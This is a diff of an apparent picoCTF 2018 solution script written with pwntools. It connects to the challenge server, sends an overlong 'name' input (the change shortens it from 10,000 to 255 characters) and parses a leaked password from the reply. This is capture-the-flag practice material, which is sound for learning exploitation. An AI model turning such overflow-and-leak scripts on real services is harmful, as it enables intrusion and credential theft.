@@ -4,7 +4,7 @@ from pwn import *
 
 r=remote('2018shell.picoctf.com', 23685)
 r.recvuntil('name')
-r.sendline('a'*10000)
+r.sendline('a'*255)
 
 password=r.recvall().split(',')[1].split('\n')[0].strip()
 
